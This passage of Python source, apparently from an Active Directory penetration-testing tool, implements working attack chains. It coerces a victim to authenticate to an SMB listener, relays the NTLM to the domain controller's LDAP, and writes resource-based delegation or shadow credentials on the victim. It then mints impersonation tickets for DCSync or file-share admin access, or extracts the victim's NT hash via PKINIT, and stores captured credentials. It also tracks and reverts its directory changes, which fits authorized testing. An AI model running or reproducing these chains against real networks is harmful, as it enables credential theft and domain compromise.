    relayed victim writes its own ``msDS-KeyCredentialLink``; we then PKINIT with
    the minted key to recover its NT hash. The KeyCredentialLink change is
    registered in the ledger the moment it lands and reverted by restoring the
    prior list. Sets ``success["ok"] = True`` once the KeyCredentialLink lands.
    """
    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415

    _print_chain_preflight_shadow(
        victim=parsed.victim or "",
        dc_ip=dc_ip,
        listener_ip=listener_ip,
    )

    # 4. Coerce + relay -> append msDS-KeyCredentialLink on the victim (SELF).
    relay_outcome = run_async_sync(
        _coerce_relay_shadow_creds(
            shell=shell,
            victim=parsed.victim or "",
            dc_ip=dc_ip,
            domain=domain,
            username=username,
            secret=secret,
            listener_ip=listener_ip,
            socks5=parsed.socks5,
        )
    )
    # Safe point: see the RBCD chain; the loop has finished.
    present_pending_callback_advice(shell)
    sc_result = _first_relay_result(relay_outcome)
    if sc_result is None or not sc_result.success:
        err = sc_result.error if sc_result else "no authentication captured"
        print_warning(
            f"Shadow-credentials relay did not land: {err}. "
            "Verify the listener IP is reachable from the victim and that the "
            "victim authenticated with NTLMv1 / the DC is CVE-2019-1040 vulnerable."
        )
        return

    meta = dict(sc_result.metadata or {})
    state.shadow_target_dn = meta.get("target_dn")
    state.shadow_prior_values = list(meta.get("prior_keycred_values") or [])

    # Register the KeyCredentialLink change IMMEDIATELY so cleanup restores it.
    # Durable AD grant -> operator_confirmed. The exact prior KeyCredentialLink
    # list is persisted in the ledger detail so the exit reverter is
    # self-contained.
    if ledger is not None:
        try:
            state.shadow_change_id = ledger.register_change(
                kind="keycredentiallink_added",
                domain=domain,
                target=str(meta.get("target_computer") or parsed.victim or ""),
                detail={
                    "target_dn": state.shadow_target_dn,
                    "device_id": meta.get("device_id"),
                    "prior_keycred_count": meta.get("prior_keycred_count"),
                    "prior_keycred_values": list(state.shadow_prior_values or []),
                    "prior_attribute_empty": bool(meta.get("prior_attribute_empty")),
                },
                method="relay_ldap_shadow_creds_self",
                change_class=CHANGE_CLASS_OPERATOR_CONFIRMED,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)

    # The durable KeyCredentialLink has landed: a SUCCESS from here keeps it.
    success["ok"] = True

    # 5. PKINIT -> NT hash (reuse the credentialed shadow-creds PKINIT tail).
    nt_hash = _pkinit_nt_hash_from_pfx(
        domain=domain,
        dc_ip=dc_ip,
        target_sam=str(meta.get("target_sam") or ""),
        pfx_b64=str(meta.get("pfx_b64") or ""),
    )

    # 6. Premium result panel.
    _print_shadow_result_panel(
        victim=parsed.victim or "",
        dc_ip=dc_ip,
        target_sam=str(meta.get("target_sam") or ""),
        nt_hash=nt_hash,
    )


def _provision_delegate(
    shell: Any,
    *,
    parsed: RelayRbcdArgs,
    domain: str,
    dc_ip: str,
    username: str,
    secret: str,
    ledger: Any,
) -> Optional[_PlannedDelegate]:
    """Create the delegate machine account (or adopt --actor-sid). Registers it in the ledger."""
    if parsed.actor_sid:
        print_info(
            f"Using existing controlled delegate SID "
            f"{mark_sensitive(parsed.actor_sid, 'text')} (no account created)."
        )
        return _PlannedDelegate(sid=parsed.actor_sid, created=False)

    from adscan_internal.services.domain_posture import get_posture  # noqa: PLC0415
    from adscan_internal.services.exploitation.minted_account_identity import (  # noqa: PLC0415
        default_minted_identity,
        prompt_minted_account_identity,
    )
    from adscan_internal.services.ldap_transport_service import (  # noqa: PLC0415
        ADscanLDAPConfig,
    )

    # Before minting, offer to REUSE an existing owned machine account (persisted
    # by a prior run via add_credential) instead of creating a fresh one — this
    # avoids burning the domain MachineAccountQuota on every run.
    reuse = _select_reusable_delegate(
        shell, domain=domain, dc_ip=dc_ip, username=username, secret=secret
    )
    if reuse is not None:
        return reuse

    from adscan_internal.services.machine_account_provisioning_service import (  # noqa: PLC0415
        acquire_controlled_machine_account,
        generate_machine_account_name,
    )

    _unused_name, default_password = default_minted_identity(
        shell, domain=domain, username=username, password=secret
    )
    # ADscan's computer accounts carry one recognisable name shape (ADSCAN + 8
    # hex, inside the 15-character NetBIOS limit); the operator may override it.
    default_name = generate_machine_account_name().rstrip("$")
    name, machine_password = prompt_minted_account_identity(
        shell, default_username=default_name, default_password=default_password
    )

    posture = get_posture(getattr(shell, "domains_data", {}) or {}, domain=domain)
    ldap_config = ADscanLDAPConfig(
        domain=domain,
        dc_ip=dc_ip,
        use_ldaps=True,
        use_kerberos=False,
        username=username,
        password=secret,
        posture_snapshot=posture,
    )

    print_info(
        f"Creating delegate machine account {mark_sensitive(name + '$', 'user')} "
        f"in {mark_sensitive(domain, 'domain')}…"
    )
    lease = acquire_controlled_machine_account(
        shell,
        domain=domain,
        actor_ldap_config=ldap_config,
        actor_username=username,
        purpose="rbcd_relay_delegate",
        method="relay_rbcd_delegate_mint",
        computer_name=name,
        password=machine_password,
    )
    if lease is None:
        print_error(
            "Could not obtain a delegate machine account (quota exhausted or creation "
            "refused). Re-run with --actor-sid <SID> using an already-controlled "
            "machine account."
        )
        return None

    delegate = _PlannedDelegate(
        sid=lease.sid or "",
        sam=lease.sam_account_name,
        password=lease.password,
        dn=lease.dn,
        # A retained account (retain_one) is reused, never deleted by this run.
        created=lease.created,
        ledger_change_id=lease.ledger_change_id,
    )
    if not delegate.sid:
        print_warning(
            "Created the delegate but could not resolve its SID — the RBCD write "
            "needs it. Aborting (the account will be cleaned up)."
        )
        return None
    print_success(
        f"Delegate {'created' if lease.created else 'reused'}: "
        f"{mark_sensitive(delegate.sam, 'user')} "
        f"(SID {mark_sensitive(delegate.sid, 'text')})"
    )

    # Persist the delegate as an owned credential so the create-vs-reuse
    # selector offers it. Skip verification and every privilege prompt.
    try:
        from adscan_internal.cli.creds import add_credential  # noqa: PLC0415

        add_credential(
            shell,
            domain=domain,
            user=delegate.sam,
            cred=lease.password,
            verify_credential=False,
            prompt_for_user_privs_after=False,
            skip_user_privs_enumeration=True,
            prompt_local_reuse_after=False,
            ui_silent=True,
            mark_user_compromised=True,
            credential_origin="relay_rbcd_minted_machine_account",
        )
    except Exception as exc:  # noqa: BLE001 - persistence is best-effort
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_info_debug(
            f"[relay-rbcd] could not persist minted delegate credential: {exc}"
        )

    return delegate
def _select_reusable_delegate(
    shell: Any, *, domain: str, dc_ip: str, username: str, secret: str
) -> Optional[_PlannedDelegate]:
    """Offer reusing an existing owned machine account as the RBCD delegate.

    The reuse pool is owned machine accounts (sAMAccountName ending in ``$``)
    for which the workspace holds a secret — typically delegates a previous run
    minted and persisted via ``add_credential``. Returns a
    ``_PlannedDelegate(created=False)`` when the operator picks one (so cleanup
    never deletes it), or ``None`` to fall through to minting a fresh account
    (operator chose "create new", there are no candidates, or non-interactive).

    The create-vs-reuse decision is resolved through the shared
    :func:`plan_privileged_account` SSOT (create-new is the safe non-interactive
    default); RBCD-specific prompt wording is preserved so the operator UX is
    unchanged. A cancel falls through to minting a fresh account, identical to
    the pre-SSOT behaviour.
    """
    from adscan_internal.services.privileged_account_provisioning import (  # noqa: PLC0415
        ProvisioningAction,
        decide_provisioning_action,
    )

    try:
        creds = (
            (getattr(shell, "domains_data", {}) or {})
            .get(domain, {})
            .get("credentials", {})
            or {}
        )
    except Exception:  # noqa: BLE001
        creds = {}

    candidates = [
        user
        for user, secret_val in creds.items()
        if str(user).strip().endswith("$") and str(secret_val or "").strip()
    ]
    if not candidates:
        return None

    action, chosen = decide_provisioning_action(
        shell,
        reuse_candidates=candidates,
        prompt_title="RBCD delegate account",
        create_label="Create a new machine account (adscan_<timestamp>$)",
        reuse_label_prefix="Reuse owned machine account: ",
        allow_cancel=False,  # legacy menu had no Cancel row; back-out mints fresh
    )
    # Create-new / non-interactive both fall through to minting a fresh account —
    # byte-identical to the previous ``idx is None or idx == 0`` guard.
    if action is not ProvisioningAction.REUSE_EXISTING or not chosen:
        return None

    chosen_secret = str(creds.get(chosen) or "").strip()
    sid = (
        _resolve_delegate_sid(
            domain=domain, dc_ip=dc_ip, username=username, secret=secret, sam=chosen
        )
        or ""
    )
    if not sid:
        print_warning(
            f"Could not resolve the SID for {mark_sensitive(chosen, 'user')}; "
            "minting a new delegate instead."
        )
        return None
    print_info(
        f"Reusing owned machine account {mark_sensitive(chosen, 'user')} as the "
        "RBCD delegate (no new account minted)."
    )
    return _PlannedDelegate(
        sid=sid, sam=chosen, password=chosen_secret, dn=None, created=False
    )


def _resolve_delegate_sid(
    *, domain: str, dc_ip: str, username: str, secret: str, sam: str
) -> Optional[str]:
    """Resolve a sAMAccountName to its objectSid via a credentialed LDAP connection."""
    try:
        from adscan_internal.services.ldap_transport_service import (  # noqa: PLC0415
            ADscanLDAPConfig,
            ADscanLDAPConnection,
        )
        from adscan_internal.services.machine_account_provisioning_service import (  # noqa: PLC0415
            _resolve_principal_sid,
        )

        # ADscanLDAPConfig has no nt_hash field: an NT hash rides in ``password``
        # and the transport binds pass-the-hash. Dropping it (the previous
        # ``None if is_nt``) bound as ``username`` with an empty secret.
        config = ADscanLDAPConfig(
            domain=domain,
            dc_ip=dc_ip,
            use_ldaps=True,
            use_kerberos=False,
            username=username,
            password=secret,
        )
        with ADscanLDAPConnection(config) as conn:
            return _resolve_principal_sid(conn, sam)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_info_debug(f"[relay-ldap] delegate SID resolution failed: {exc}")
        return None


async def _coerce_relay_rbcd(
    *,
    shell: Any = None,
    victim: str,
    dc_ip: str,
    domain: str,
    username: str,
    secret: str,
    listener_ip: str,
    delegate_sid: str,
    socks5: Optional[str],
) -> Any:
    """Mirror esc_relay's coerce+relay chain, swapping the ADCS target for RBCD.

    Stands up an SMB relay listener (445), coerces the VICTIM to authenticate
    back to it, and relays that NTLM into the DC's LDAP where the
    :class:`LDAPRBCDRelayTarget` (SELF target) writes RBCD granting the delegate.
    """
    from adscan_internal.services.relay.ldap_modify import (  # noqa: PLC0415
        LDAPRBCDRelayConfig,
        LDAPRBCDRelayTarget,
    )

    target = LDAPRBCDRelayTarget(
        LDAPRBCDRelayConfig(
            dc_ip=dc_ip,
            domain=domain,
            actor_sid=delegate_sid,
            target_computer=None,  # SELF — the relayed victim writes RBCD on itself
        )
    )
    return await _coerce_relay_with_target(
        shell=shell,
        target=target,
        victim=victim,
        dc_ip=dc_ip,
        domain=domain,
        username=username,
        secret=secret,
        listener_ip=listener_ip,
        socks5=socks5,
    )


async def _coerce_relay_shadow_creds(
    *,
    shell: Any = None,
    victim: str,
    dc_ip: str,
    domain: str,
    username: str,
    secret: str,
    listener_ip: str,
    socks5: Optional[str],
) -> Any:
    """Coerce+relay chain that appends ``msDS-KeyCredentialLink`` (SELF target).

    Identical orchestration to the RBCD path; only the relay target differs.
    """
    from adscan_internal.services.relay.ldap_modify import (  # noqa: PLC0415
        LDAPShadowCredsRelayConfig,
        LDAPShadowCredsRelayTarget,
    )

    target = LDAPShadowCredsRelayTarget(
        LDAPShadowCredsRelayConfig(
            dc_ip=dc_ip,
            domain=domain,
            target_computer=None,  # SELF — the relayed victim writes its own key
        )
    )
    return await _coerce_relay_with_target(
        shell=shell,
        target=target,
        victim=victim,
        dc_ip=dc_ip,
        domain=domain,
        username=username,
        secret=secret,
        listener_ip=listener_ip,
        socks5=socks5,
    )


async def _coerce_relay_with_target(
    *,
    shell: Any = None,
    target: Any,
    victim: str,
    dc_ip: str,
    domain: str,
    username: str,
    secret: str,
    listener_ip: str,
    socks5: Optional[str],
) -> Any:
    """Shared coerce+relay orchestration (both methods); only the target differs."""
    from aiosmb.commons.connection.factory import SMBConnectionFactory  # noqa: PLC0415

    from adscan_internal.services.coercion.runner import (  # noqa: PLC0415
        NativeCoercionRunConfig,
    )
    from adscan_internal.services.ntlm_capture_workflow import (  # noqa: PLC0415
        build_socks5_proxies,
    )
    from adscan_internal.services.relay import (  # noqa: PLC0415
        NativeCoerceRelayConfig,
        NativeRelayRunConfig,
        run_native_coerce_and_relay,
    )

    secret_type = "nt" if _looks_like_nt_hash(secret) else "password"
    proxies = build_socks5_proxies(socks5)

    # Coercion uses NTLM (the victim's spontaneous NTLM auth is what we relay);
    # the Kerberos SPN rule does not apply to the NTLM trigger path. Target = victim.
    factory = SMBConnectionFactory.from_components(
        victim,
        username,
        secret,
        secrettype=secret_type,
        domain=domain,
        dcip=dc_ip,
        authproto="ntlm",
        proxies=proxies,
    )

    return await run_native_coerce_and_relay(
        targets=[target],
        coercion_connection_factory=factory,
        coercion_target_host=victim,
        coercion_target_name=victim,
        config=NativeCoerceRelayConfig(
            shell=shell,
            listener_host=listener_ip,
            relay=NativeRelayRunConfig(
                source="smb",
                listen_host="0.0.0.0",
                listen_port=445,
                max_authentications=1,
                timeout_seconds=120,
                stop_on_first_success=True,
            ),
            coercion=NativeCoercionRunConfig(
                listener_host=listener_ip,
                listener_auth_type="smb",
                timeout_seconds=60,
                # Empty protocols => walk every coercion vector, stop on capture.
                protocols=(),
                transports=("ncan_np",),
                show_summary=False,
            ),
        ),
    )


def _pkinit_nt_hash_from_pfx(
    *, domain: str, dc_ip: str, target_sam: str, pfx_b64: str
) -> Optional[str]:
    """PKINIT with the minted KeyCredential PFX to recover the target's NT hash.

    Reuses the credentialed shadow-creds PKINIT tail
    (``adcs/shadow_credentials.py:86-106``) — same kerbad U2U + PAC NT-hash
    extraction. Returns the NT hash, or ``None`` on failure.
    """
    if not pfx_b64 or not target_sam:
        print_warning("Shadow-creds relay landed but PKINIT material is missing.")
        return None
    try:
        import urllib.parse  # noqa: PLC0415

        from kerbad.common import factory as kerberos_factory  # noqa: PLC0415
        from kerbad.protocol.external import ticketutil  # noqa: PLC0415
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_warning(f"PKINIT import failed: {exc}")
        return None

    try:
        pfx_quoted = urllib.parse.quote(pfx_b64, safe="")
        kerberos_url = (
            f"kerberos+pfxstr://{domain}\\{target_sam}@{dc_ip}/"
            f"?certdata={pfx_quoted}&timeout=350"
        )
        kfactory = kerberos_factory.KerberosClientFactory.from_url(kerberos_url)
        client = kfactory.get_client_blocking()
        _tgs, _enctgs, _key, decrypted = client.with_clock_skew(client.U2U)
        for _principal, nt_hash in ticketutil.get_NT_from_PAC(client.pkinit_tkey, decrypted):
            if str(nt_hash or "").strip():
                return str(nt_hash).strip()
        print_warning("PKINIT succeeded but no NT hash extracted from the PAC.")
        return None
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_warning(f"PKINIT->NT-hash failed: {exc}")
        return None


def _first_relay_result(relay_outcome: Any) -> Any:
    """Return the first relay target result from a coerce-and-relay outcome, or None."""
    relay_result = getattr(relay_outcome, "relay_result", None)
    results = getattr(relay_result, "results", None) or ()
    return results[0] if results else None


def _resolve_victim_spn_host(
    shell: Any, *, victim: str, domain: str, dc_ip: str
) -> Optional[str]:
    """Resolve a victim IP to its FQDN for a Kerberos SPN (FQDN-only rule).

    Uses the centralized ``kerberos_spn_resolution`` service: the workspace
    massdns / reachability inventory plus a live PTR through the configured
    resolver (the KDC IP). Returns the FQDN, or ``None`` when it cannot be
    recovered (the caller then asks the operator for an explicit ``--spn``).
    """
    try:
        from adscan_internal.services.kerberos_hostname_inventory import (  # noqa: PLC0415
            load_workspace_ip_hostname_inventory,
        )
        from adscan_internal.services.kerberos_spn_resolution import (  # noqa: PLC0415
            resolve_spn_or_decide_ntlm,
        )
        from adscan_internal.services.kerberos_spn_resolution import (  # noqa: PLC0415
            is_ip_address,
        )
    except Exception:  # noqa: BLE001
        return None

    inventory = None
    workspace_dir = _get_workspace_dir(shell)
    domains_dir = getattr(shell, "domains_dir", None) or ""
    if workspace_dir and domains_dir:
        try:
            inventory = (
                load_workspace_ip_hostname_inventory(
                    workspace_dir=workspace_dir,
                    domains_dir=domains_dir,
                    domain=domain,
                )
                or None
            )
        except Exception:  # noqa: BLE001 - inventory is best-effort
            inventory = None

    try:
        resolution = resolve_spn_or_decide_ntlm(
            target_host=victim,
            domain=domain,
            domains_data=getattr(shell, "domains_data", None),
            ip_hostname_inventory=inventory,
            resolver_ip=dc_ip,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return None

    spn_host = getattr(resolution, "spn_host", None)
    if (
        getattr(resolution, "kerberos_viable", False)
        and spn_host
        and not is_ip_address(spn_host)
    ):
        return spn_host
    return None


def _run_s4u(
    shell: Any,
    *,
    parsed: RelayRbcdArgs,
    domain: str,
    dc_ip: str,
    delegate: _PlannedDelegate,
) -> Optional[str]:
    """Run S4U2Self+Proxy as the delegate, impersonating the privileged user.

    Returns the ccache path on success, ``None`` otherwise. When the delegate is
    an existing ``--actor-sid`` account we do not hold its password, so S4U is
    skipped with a clear note (the RBCD write itself still landed).
    """
    if not delegate.sam or not delegate.password:
        print_warning(
            "Skipping S4U: no delegate secret available (e.g. an --actor-sid "
            "account whose password we don't hold). The RBCD write landed; run "
            "S4U manually with the delegate's credentials."
        )
        return None

    spn = (parsed.spn or "").strip()
    if not spn:
        victim = (parsed.victim or "").strip()
        if _looks_like_ip(victim):
            # A Kerberos SPN must be an FQDN, never an IP. Recover the victim's
            # FQDN via the centralized resolver (workspace massdns/reachability
            # inventory + live PTR through the configured resolver) rather than
            # forcing the operator to hand-type --spn.
            spn_host = _resolve_victim_spn_host(
                shell, victim=victim, domain=domain, dc_ip=dc_ip
            )
            if not spn_host:
                print_warning(
                    f"Skipping S4U: could not resolve {mark_sensitive(victim, 'ip')} to "
                    "an FQDN for the SPN. Re-run with --spn cifs/<victim-fqdn> to mint "
                    "the impersonation ticket (the RBCD write already landed)."
                )
                return None
            spn = f"cifs/{spn_host}"
            print_info_debug(
                f"[relay-rbcd] resolved victim {mark_sensitive(victim, 'ip')} → SPN host "
                f"{mark_sensitive(spn_host, 'hostname')}"
            )
        else:
            spn = f"cifs/{victim}"

    from adscan_internal.services.exploitation.delegation_native import (  # noqa: PLC0415
        run_s4u_get_st_native,
    )
    from adscan_internal.models.service_ticket import ServiceTicketKind  # noqa: PLC0415
    from adscan_internal.services.credential_store_service import (  # noqa: PLC0415
        persist_service_ticket,
    )

    # The SPN host (FQDN) the tickets are minted for.
    spn_host = spn.split("/", 1)[1].strip() if "/" in spn else (parsed.victim or "")

    # Service selection. Honour an explicit --spn (operator override → that one
    # service only). Otherwise mint the DC-aware family: a relay-RBCD against a
    # DC also needs ldap/<dc> for DCSync — previously only cifs was minted, so a
    # relayed RBCD on a DC could never drive DCSync. Single-source via
    # domain_controller_classifier (Batch A).
    if (parsed.spn or "").strip():
        spns_to_mint = [spn]
    else:
        from adscan_internal.services.domain_controller_classifier import (  # noqa: PLC0415
            is_dc_host,
        )

        # relay-RBCD-relevant services: cifs (DumpLSA / SMB admin) always, plus
        # ldap when the victim is a DC (DCSync via DRSUAPI). NOT the full
        # cifs/http/ldap altservice family (http is unused here → gratuitous 4769).
        # DC-ness is single-sourced via is_dc_host (Batch A).
        is_dc = is_dc_host(
            host=spn_host, domains_data=getattr(shell, "domains_data", {}), domain=domain
        )
        services = ["cifs", "ldap"] if is_dc else ["cifs"]
        spns_to_mint = [f"{svc}/{spn_host}" for svc in services]

    workspace_dir = _get_workspace_dir(shell)
    safe_target = (parsed.victim or "victim").replace("/", "_").replace("\\", "_")
    primary_ccache: Optional[str] = None
    for svc_spn in spns_to_mint:
        svc_class = svc_spn.split("/", 1)[0].strip().lower()
        ccache_path = os.path.join(
            workspace_dir,
            f"{parsed.impersonate}@{safe_target}.{svc_class}.{domain}.ccache",
        )
        print_info(
            f"Requesting S4U ticket as {mark_sensitive(delegate.sam, 'user')} "
            f"impersonating {mark_sensitive(parsed.impersonate, 'user')} for "
            f"{mark_sensitive(svc_spn, 'service')}…"
        )
        try:
            outcome = run_s4u_get_st_native(
                domain=domain,
                kdc_ip=dc_ip,
                username=delegate.sam,
                password=delegate.password,
                nt_hash=None,
                impersonate_user=parsed.impersonate,
                service_spn=svc_spn,
                ccache_output_path=ccache_path,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            print_warning(f"S4U ticket request failed for {svc_spn}: {exc}")
            continue

        if getattr(outcome, "success", False):
            produced_ccache = getattr(outcome, "ticket_path", None) or ccache_path
            # Persist each minted S4U2Proxy ticket as a host-scoped ServiceTicket so
            # a follow-up step against the same victim reuses the impersonated
            # principal (cifs → DumpLSA, ldap → DCSync) instead of re-deriving a
            # generic (under-privileged) credential. Derived service ticket (NOT a
            # TGT) — the shared helper routes it to service_tickets.
            persist_service_ticket(
                getattr(shell, "domains_data", {}),
                domain=domain,
                ccache_path=produced_ccache,
                kind=ServiceTicketKind.RBCD,
                owner_principal=delegate.sam or "",
                impersonated_user=parsed.impersonate,
                spn=svc_spn,
                target_host=spn_host,
            )
            # Return the cifs ticket as the primary (back-compat with callers that
            # treat the result as the SMB/DumpLSA credential); fall back to the
            # first minted service if cifs was not requested.
            if primary_ccache is None or svc_class == "cifs":
                primary_ccache = produced_ccache
        else:
            print_warning(
                f"S4U ticket request did not succeed for {svc_spn}: "
                f"{getattr(outcome, 'error_message', None)}"
            )

    return primary_ccache


def _print_chain_preflight(
    *, victim: str, dc_ip: str, listener_ip: str, delegate: _PlannedDelegate
) -> None:
    """Render a pre-flight panel before standing up the listener (mirrors esc_relay)."""
    from rich.panel import Panel  # noqa: PLC0415
    from rich.table import Table  # noqa: PLC0415
    from rich.text import Text  # noqa: PLC0415

    from adscan_core.rich_output import get_console  # noqa: PLC0415

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=15)
    grid.add_column(style="bold")

    grid.add_row("Technique", "[bold cyan]NTLM relay → LDAP → RBCD (SELF)[/]")
    grid.add_row("", "")
    grid.add_row("Coerce target", mark_sensitive(victim, "hostname"))
    grid.add_row("Relay target", f"{mark_sensitive(dc_ip, 'hostname')} — [magenta]LDAP[/]")
    grid.add_row(
        "Delegate",
        (
            f"{mark_sensitive(delegate.sam, 'user')}"
            if delegate.sam
            else mark_sensitive(delegate.sid, "text")
        ),
    )
    grid.add_row("", "")
    grid.add_row(
        "Listener",
        f"[yellow]SMB[/] {mark_sensitive(listener_ip, 'ip')}:445",
    )
    grid.add_row(
        "Return route",
        "[yellow]⚠  the victim must reach this listener for coercion to land[/]",
    )

    title = Text("  RBCD Coerce-and-Relay  ", style="bold white on blue")
    get_console().print(Panel(grid, title=title, border_style="blue", padding=(1, 2)))


def _print_chain_preflight_shadow(*, victim: str, dc_ip: str, listener_ip: str) -> None:
    """Pre-flight panel for the shadow-credentials chain (no delegate account)."""
    from rich.panel import Panel  # noqa: PLC0415
    from rich.table import Table  # noqa: PLC0415
    from rich.text import Text  # noqa: PLC0415

    from adscan_core.rich_output import get_console  # noqa: PLC0415

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=15)
    grid.add_column(style="bold")

    grid.add_row("Technique", "[bold cyan]NTLM relay → LDAP → Shadow Credentials (SELF)[/]")
    grid.add_row("", "")
    grid.add_row("Coerce target", mark_sensitive(victim, "hostname"))
    grid.add_row("Relay target", f"{mark_sensitive(dc_ip, 'hostname')} — [magenta]LDAP[/]")
    grid.add_row("Write", "[bold]msDS-KeyCredentialLink[/] (append)")
    grid.add_row("Post-ex", "[bold]PKINIT → NT hash[/] of the victim")
    grid.add_row("", "")
    grid.add_row(
        "Listener",
        f"[yellow]SMB[/] {mark_sensitive(listener_ip, 'ip')}:445",
    )
    grid.add_row(
        "Return route",
        "[yellow]⚠  the victim must reach this listener for coercion to land[/]",
    )

    title = Text("  Shadow-Credentials Coerce-and-Relay  ", style="bold white on blue")
    get_console().print(Panel(grid, title=title, border_style="blue", padding=(1, 2)))


def _print_result_panel(
    *,
    victim: str,
    dc_ip: str,
    delegate: _PlannedDelegate,
    impersonate: str,
    ccache_path: Optional[str],
    already_set: bool,
) -> None:
    """Render the premium RBCD chain-outcome panel."""
    from rich.panel import Panel  # noqa: PLC0415
    from rich.table import Table  # noqa: PLC0415
    from rich.text import Text  # noqa: PLC0415

    from adscan_core.rich_output import get_console  # noqa: PLC0415

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=15)
    grid.add_column()

    grid.add_row("Status", "[bold green]✓ RBCD chain executed[/]")
    grid.add_row("", "")
    grid.add_row(
        "Delegate",
        (
            f"[bold red]{mark_sensitive(delegate.sam, 'user')}[/]"
            if delegate.sam
            else mark_sensitive(delegate.sid, "text")
        )
        + ("  [dim](created)[/]" if delegate.created else "  [dim](existing)[/]"),
    )
    rbcd_note = "already present" if already_set else "written"
    grid.add_row(
        "RBCD on victim",
        f"{mark_sensitive(victim, 'hostname')}  [dim]({rbcd_note})[/]",
    )
    grid.add_row("Relayed via", f"{mark_sensitive(dc_ip, 'hostname')} [dim]LDAP[/]")
    grid.add_row("", "")
    if ccache_path:
        grid.add_row(
            "S4U ticket",
            f"[bold green]minted[/] impersonating "
            f"[bold red]{mark_sensitive(impersonate, 'user')}[/]",
        )
        grid.add_row("ccache", mark_sensitive(ccache_path, "path"))
        grid.add_row("", "")
        grid.add_row(
            "Use it",
            f"[dim]export KRB5CCNAME={mark_sensitive(ccache_path, 'path')} "
            "then authenticate to the victim with Kerberos[/]",
        )
    else:
        grid.add_row(
            "S4U ticket",
            "[yellow]not minted[/] [dim](see notes above — RBCD is in place)[/]",
        )
    grid.add_row("", "")
    grid.add_row(
        "Cleanup",
        "[dim]kept for reuse this session — you'll be prompted to revert at exit[/]",
    )

    title = Text("  RBCD Relay — Chain Result  ", style="bold white on green")
    get_console().print(Panel(grid, title=title, border_style="green", padding=(1, 2)))


def _print_shadow_result_panel(
    *,
    victim: str,
    dc_ip: str,
    target_sam: str,
    nt_hash: Optional[str],
) -> None:
    """Render the premium shadow-credentials chain-outcome panel."""
    from rich.panel import Panel  # noqa: PLC0415
    from rich.table import Table  # noqa: PLC0415
    from rich.text import Text  # noqa: PLC0415

    from adscan_core.rich_output import get_console  # noqa: PLC0415

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=15)
    grid.add_column()

    grid.add_row("Status", "[bold green]✓ Shadow-Credentials chain executed[/]")
    grid.add_row("", "")
    grid.add_row(
        "KeyCredentialLink",
        f"appended on {mark_sensitive(victim, 'hostname')}",
    )
    if target_sam:
        grid.add_row("Target account", f"[bold red]{mark_sensitive(target_sam, 'user')}[/]")
    grid.add_row("Relayed via", f"{mark_sensitive(dc_ip, 'hostname')} [dim]LDAP[/]")
    grid.add_row("", "")
    if nt_hash:
        grid.add_row(
            "NT hash",
            f"[bold green]recovered[/]  {mark_sensitive(nt_hash, 'hash')}",
        )
        grid.add_row(
            "Use it",
            "[dim]pass-the-hash / overpass-the-hash against the victim[/]",
        )
    else:
        grid.add_row(
            "NT hash",
            "[yellow]not recovered[/] [dim](PKINIT failed — KeyCredentialLink is in place)[/]",
        )
    grid.add_row("", "")
    grid.add_row(
        "Cleanup",
        "[dim]left in place this session — resolved at workspace exit[/]",
    )

    title = Text("  Shadow-Credentials Relay — Chain Result  ", style="bold white on green")
    get_console().print(Panel(grid, title=title, border_style="green", padding=(1, 2)))


def _cleanup(
    shell: Any,
    *,
    domain: str,
    dc_ip: str,
    username: str,
    secret: str,
    ledger: Any,
    state: _RbcdLedgerState,
    succeeded: bool,
) -> None:
    """Per-run cleanup of the durable changes — reverts ONLY on failure/abort.

    On SUCCESS (``succeeded=True``) the durable ``operator_confirmed`` changes
    stay standing (``pending``) so the operator can reuse the minted account in
    the same session; the workspace-exit hook resolves them once (revert by
    default when unattended, ask interactively). They are deliberately NOT marked
    ``kept`` here: ``kept`` is terminal, so the exit hook would never see them and
    a successful run would leave them in the directory whatever the policy says.
    On FAILURE/abort (``succeeded=False``) the partial changes are
    reverted as before, so a failed run leaves no mess.

    Uses our own shell credentials via a credentialed LDAP connection. Each
    reverted change is marked in the ledger; failures are marked with
    manual-cleanup instructions (never silently lost). The disable-fallback for
    machine accounts that cannot be deleted is preserved.
    """
    nothing_changed = (
        state.delegate is None
        and state.rbcd_change_id is None
        and state.rbcd_target_dn is None
        and state.shadow_change_id is None
        and state.shadow_target_dn is None
    )
    if nothing_changed:
        return  # nothing was changed

    if succeeded:
        # Leave the durable assets standing for the rest of the session; the
        # workspace-exit hook resolves them (durable_change_policy).
        print_info(
            "Durable changes left in place for reuse this session — they are "
            "resolved at workspace exit (reverted by default when unattended)."
        )
        return

    print_info("Run did not complete — reverting partial changes (no mess left behind)…")
    # Delegation first, the delegate account last: the RBCD grant references it.
    for unit in _state_units(state):
        _cascade_revert_unit(
            shell,
            ledger=ledger,
            domain=domain,
            dc_ip=dc_ip,
            unit=unit,
            creator_username=username,
            creator_secret=secret,
        )


def _state_units(state: _RbcdLedgerState) -> list[tuple[str, Optional[str], _RbcdLedgerState]]:
    """Split a run's state into independently revertible units, in revert order."""
    units: list[tuple[str, Optional[str], _RbcdLedgerState]] = []
    if state.rbcd_target_dn:
        units.append(
            (
                "rbcd_delegation_added",
                state.rbcd_change_id,
                _RbcdLedgerState(
                    rbcd_change_id=state.rbcd_change_id,
                    rbcd_target_dn=state.rbcd_target_dn,
                    rbcd_prior_sd_hex=state.rbcd_prior_sd_hex,
                    rbcd_prior_empty=state.rbcd_prior_empty,
                ),
            )
        )
    if state.shadow_target_dn:
        units.append(
            (
                "keycredentiallink_added",
                state.shadow_change_id,
                _RbcdLedgerState(
                    shadow_change_id=state.shadow_change_id,
                    shadow_target_dn=state.shadow_target_dn,
                    shadow_prior_values=state.shadow_prior_values,
                ),
            )
        )
